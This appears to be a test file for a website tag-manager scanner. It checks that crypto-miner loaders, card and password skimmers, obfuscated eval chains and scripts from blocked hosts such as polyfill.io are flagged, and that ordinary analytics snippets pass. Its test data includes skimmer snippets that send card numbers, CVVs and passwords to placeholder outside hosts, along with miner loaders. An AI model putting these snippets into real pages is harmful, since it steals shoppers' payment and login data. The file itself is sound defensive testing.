import { describe, expect, it } from "vitest";
import type { ContainerConfig } from "../src/config/schema";
import { deobfuscate, scanCode, scanConfig } from "../src/service/code-scan";

const ctx = { domain: "shop.test", ANALYTICS_BASE_URL: "https://analytics.example.net" };
const rules = (code: string, c: Parameters<typeof scanCode>[2] = ctx) =>
  scanCode("tags.0.params.code", code, c).map((f) => `${f.rule}:${f.strong}`);

describe("custom code checks: what's refused", () => {
  it("crypto miners and their hosts are strong", () => {
    expect(rules("var miner = new CoinHive.Anonymous('SITE_KEY'); miner.start();")).toEqual(["miner:true"]);
    expect(rules('<script src="https://authedmine.com/lib/authedmine.min.js"></script>')).toEqual(["miner:true"]);
    expect(rules("const pool = 'stratum+tcp://pool.example:3333';")).toEqual(["miner:true"]);
    expect(rules("new WebSocket('wss://gulf.moneroocean.stream:10128')")).toEqual(["miner:true"]);
    // Hidden behind string tricks: hex escapes, concatenation, atob, fromCharCode.
    expect(rules("var s = '\\x63oin' + 'hive'; load(s);")).toEqual(["miner:true"]);
    expect(rules(`load(atob("${btoa("https://coinhive.com/lib/coinhive.min.js")}"))`)).toContain("miner:true");
    const codes = [..."coinimp.com"].map((c) => c.charCodeAt(0)).join(",");
    expect(rules(`var h = String.fromCharCode(${codes});`)).toContain("miner:true");
  });

  it("skimmers: a password or card field read and sent to another site is strong; sent nowhere visible it's refused only", () => {
    const strong = `document.querySelector('form').addEventListener('submit', function () {
      var c = document.querySelector('input[name="cardnumber"]').value;
      var v = document.getElementById('cvv').value;
      new Image().src = 'https://cdn-stats.example.org/p.gif?d=' + btoa(c + '|' + v);
    });`;
    expect(rules(strong)).toEqual(["skimmer:true"]);
    const pw = "fetch('https://collector.example.io/x', { method: 'POST', body: $('#password').val() })";
    expect(rules(pw)).toEqual(["skimmer:true"]);
    // The address is decoded at run time: strong too.
    const hidden = "var u = atob(window.k); navigator.sendBeacon(u, document.querySelector('[autocomplete=cc-number]').value)";
    expect(rules(hidden)).toEqual(["skimmer:true"]);
    // Posting to the site itself: refused, not paused.
    const same = "fetch('/api/login', { method: 'POST', body: document.getElementById('password').value })";
    expect(rules(same)).toEqual(["skimmer:false"]);
    expect(rules("fetch('https://www.shop.test/api', { body: document.getElementById('password').value })")).toEqual(["skimmer:false"]);
    // A password meter loading its library from a CDN: refused (it reads the field), but not paused.
    const meter =
      "var s = document.createElement('script'); s.src = 'https://cdnjs.cloudflare.com/ajax/libs/zxcvbn/4.4.2/zxcvbn.js'; document.getElementById('password').oninput = function () { show(zxcvbn(this.value)); };";
    expect(rules(meter)).toEqual(["skimmer:false"]);
    // ...while a "library" URL with the data in its query is somewhere data goes.
    expect(rules("new Image().src = 'https://cdn.example.net/x.js?d=' + document.querySelector('#cvc').value")).toEqual(["skimmer:true"]);
  });

  it("obfuscated eval chains and packers are refused (not paused)", () => {
    expect(rules("eval(atob('YWxlcnQoMSk='))")).toEqual(["obfuscated_eval:false"]);
    expect(rules("new Function(unescape('%61%6c%65%72%74'))()")).toEqual(["obfuscated_eval:false"]);
    expect(rules("eval(function(p,a,c,k,e,d){e=function(c){return c};return p}('0',1,1,'x'.split('|'),0,{}))")).toEqual([
      "obfuscated_eval:false",
    ]);
    expect(rules("window['ev' + 'al'](code)")).toEqual(["obfuscated_eval:false"]);
    expect(rules("window['\\x65\\x76\\x61\\x6c'](code)")).toEqual(["obfuscated_eval:false"]);
    expect(rules("document.write(unescape('%3Cscript%20src%3D%22x.js%22%3E%3C%2Fscript%3E'))")).toEqual(["obfuscated_eval:false"]);
    expect(rules(`${"[]+(![])+[+[]]+()".repeat(10)}`)).toEqual(["obfuscated_eval:false"]);
  });

  it("malicious hosts: the polyfill.io family is refused; the operator's list is strong", () => {
    expect(rules('<script src="https://cdn.polyfill.io/v3/polyfill.min.js"></script>')).toEqual(["malicious_host:false"]);
    expect(rules('<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js"></script>')).toEqual(["malicious_host:false"]);
    const op = { ...ctx, EXTRA_BLOCKED_CODE_HOSTS: "bad.example, worse.example" };
    expect(rules("<img src='https://x.worse.example/p.gif'>", op)).toEqual(["malicious_host:true"]);
    // Only whole host names: notpolyfill.io and bad.example.org don't match.
    expect(rules("<script src='https://notpolyfill.io/x.js'></script><img src='https://bad.example.org/'>", op)).toEqual([]);
  });

  it("scanConfig covers custom_html, custom_js tags and variables, analytics base_url, and dom_value reading a password", () => {
    const cfg = {
      tags: [
        { id: "a", type: "custom_html", params: { html: "<script src='https://coin-hive.com/lib/x.js'></script>" }, triggers: ["t"] },
        { id: "b", type: "custom_js", params: { code: "eval(atob('YQ=='))" }, triggers: ["t"] },
        { id: "c", type: "analytics", params: { site_id: "site_x", base_url: "https://cdn.polyfill.io" }, triggers: ["t"] },
        { id: "d", type: "image_pixel", params: { url: "https://px.example/p" }, triggers: ["t"] },
      ],
      variables: [
        { name: "v", type: "custom_js", code: "return document.cookie" },
        { name: "pw", type: "dom_value", selector: "input[type=password]" },
        { name: "email", type: "dom_value", selector: "#email" },
      ],
    } as unknown as ContainerConfig;
    expect(scanConfig(cfg, ctx).map((f) => [f.path, f.rule, f.strong])).toEqual([
      ["tags.0.params.html", "miner", true],
      ["tags.1.params.code", "obfuscated_eval", false],
      ["tags.2.params.base_url", "malicious_host", false],
      ["variables.1.selector", "skimmer", false],
    ]);
  });
});

describe("custom code checks: ordinary tag code passes", () => {
  const ok = [
    // Google tag and Meta pixel snippets.
    `<script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXX"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date());gtag('config','G-XXXX');</script>`,
    `!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','123');`,
    // A form tracker that skips password fields and posts to a webhook.
    `document.addEventListener('submit', function (e) {
      var data = {};
      Array.prototype.forEach.call(e.target.elements, function (el) { if (el.type === 'password' || /card|cvv/.test(el.name)) return; data[el.name] = el.value; });
      fetch('https://hooks.zapier.com/hooks/catch/1/abc', { method: 'POST', body: JSON.stringify(data) });
    });`,
    // A show-password toggle.
    `document.getElementById('toggle').onclick = function () { var p = document.getElementById('password'); p.type = p.type === 'password' ? 'text' : 'password'; };`,
    // JSON-LD and an iframe embed.
    `<script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","url":"https://shop.test"}</script>`,
    `<iframe src="https://www.youtube.com/embed/xyz" allowfullscreen></iframe>`,
    // Minified code with lots of brackets, and JSON.parse(atob()) of config (no eval).
    `(function(){var a=[1,2,3];return a.map(function(x){return(x+1)*2})})();var cfg=JSON.parse(atob('eyJhIjoxfQ=='));`,
    // cdnjs, not the polyfill.io host.
    `<script src="https://cdnjs.cloudflare.com/ajax/libs/polyfill/3.111.0/polyfill.min.js"></script>`,
  ];
  for (const [i, code] of ok.entries())
    it(`sample ${i + 1}`, () => {
      expect(scanCode("tags.0.params.code", code, ctx)).toEqual([]);
    });

  it("de-obfuscation keeps the original text and adds what it decodes", () => {
    const d = deobfuscate("x('\\x61b' + 'c'); atob('aGVsbG8gd29ybGQ=')");
    expect(d).toContain("x('abc')");
    expect(d).toContain("hello world");
  });
});
